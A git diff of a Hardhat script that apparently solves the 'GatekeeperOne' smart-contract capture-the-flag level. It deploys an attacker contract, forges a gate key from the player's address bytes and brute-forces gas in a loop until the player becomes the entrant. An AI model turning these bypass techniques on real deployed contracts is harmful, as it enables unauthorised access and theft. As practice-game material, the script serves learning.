@@ -2,39 +2,46 @@
 import { ethers } from 'hardhat';
 import { BigNumber, Signer, BytesLike } from "ethers";
 import { getSigner } from "./signer";
+import { createLevel, submitLevel } from './utils';
 
 
 async function main() {
-  const instanceAddress = "0x9b46Fd46376e3D5606E0bb8Ac8f482090dBDC1C9";
   const signer = getSigner();
-  const Gater = await ethers.getContractFactory("GatekeeperOne");  
-  const gate = await Gater.connect(signer).attach(instanceAddress);
+  const level = await createLevel(signer, "gatekeeper one");
+  const Gater = await ethers.getContractFactory("GatekeeperOne");
+  const gate = await Gater.connect(signer).attach(level);
   await gate.deployed();
   // await gate.reset();
   console.log("current holder:", await gate.entrant());
 
 
   const Attacker = await ethers.getContractFactory("GateOneAttacker");
-  const attacker = await Attacker.deploy(instanceAddress);
+  const attacker = await Attacker.connect(signer).deploy(level);
   await attacker.deployed();
 
 
   const addressOwner = await signer.getAddress();
+  // first 4 bytes can be anything. next 2 bytes must be diff. last 2 bytes is the end of address
   const hexData = "0x12345678" + "0000" + addressOwner.substring(addressOwner.length - 4, addressOwner.length);
-  console.log(hexData);
-
-  const gasToUse = 825530
-  const gas = gasToUse;
-  try {
-    await (await attacker.tryEnter(hexData, { gasLimit: gas })).wait();
+  console.log("bytes data for cracker:",hexData);
+  let loopRange =200;
+  loopRange = 2000;
+  for (let i = 0; i < 50; i++) {
+    const tx = await attacker.brute(loopRange ,
+      {
+        gasLimit: 15000000
+      });
+    
+    await tx.wait();
+    const newHolder = await gate.entrant();
+    if(newHolder == addressOwner) break;
+    console.log("current holder:", newHolder);
+    console.log("count:", await attacker.count());
   }
-  catch (e) {
-    console.log(e);
-  }
-  // }
 
   console.log("current holder:", await gate.entrant());
-  
+  console.log("final gas used:", await attacker.finalGasPrice()); // 49342
+  await submitLevel(signer, level);
 
 }
 
